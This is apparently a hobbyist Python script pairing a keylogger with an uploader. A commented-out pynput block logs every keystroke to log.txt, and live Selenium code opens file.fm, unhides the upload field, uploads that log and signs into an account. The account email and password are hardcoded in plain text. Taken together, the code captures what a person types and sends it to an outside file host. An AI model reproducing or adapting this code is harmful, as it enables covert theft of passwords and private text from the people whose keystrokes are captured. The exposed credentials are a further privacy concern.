from pynput import keyboard
import logging
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException

# logging.basicConfig(filename="log.txt", level=logging.DEBUG, format='')
#
# #if the key is a string then do that otherwise turn it into a string
# def get_key_name(key):
#     if isinstance(key, keyboard.KeyCode): #isinstance(object,type)
#         return key.char
#     else:
#         return str(key)
#
#
# def on_press(key):
#     key_name = get_key_name(key)
#     print('Key {} pressed.'.format(key_name))
#     logging.log(10, key_name)
#     if key_name == 'Key.esc':
#         print('Exiting...')
#         return False
#
# #Start Capturing keystrokes
# with keyboard.Listener(on_press=on_press) as listener:
#     listener.join()

browser = webdriver.Firefox()
browser.get("https://file.fm/")

invisible_input = browser.find_element_by_xpath("//*[@id='file_upload']")
# make the upload button visible
browser.execute_script('arguments[0].style = ""; arguments[0].style.display = "block"; arguments[0].style.visibility = "visible";', invisible_input)
# upload logfile
browser.find_element_by_xpath("/html/body/div[1]/div/section[1]/div/div/div[2]/div[4]/div[2]/div[1]/div/input[2]").send_keys("/home/lashawn/PycharmProjects/untitled/log.txt")
invisible_input = browser.find_element_by_xpath("/html/body/div[1]/div/section[1]/div/div/div[2]/div[4]/div[1]/div")
browser.execute_script('arguments[0].style = ""; arguments[0].style.display = "block"; arguments[0].style.visibility = "visible";', invisible_input)
browser.find_element_by_xpath("/html/body/div[1]/div/section[1]/div/div/div[2]/div[4]/div[1]/div").click()
browser.find_element_by_xpath("//*[@id='sendfiles']").click()
browser.find_element_by_xpath("//*[@id='at-cv-lightbox-close']").click()
browser.find_element_by_xpath("//*[@id='signin-header']").click()
#login
browser.find_element_by_id("l_user").send_keys("mokovodev@khtyler.com")
browser.find_element_by_id("l_pass").send_keys("filefm")
browser.find_element_by_xpath("/html/body/div[1]/header/nav/div[1]/section/div[1]/div[3]/div[3]/form/div[4]").click()
browser.find_element_by_xpath("//*[@id='addcookieuploads_button_no']").click()

browser.quit()
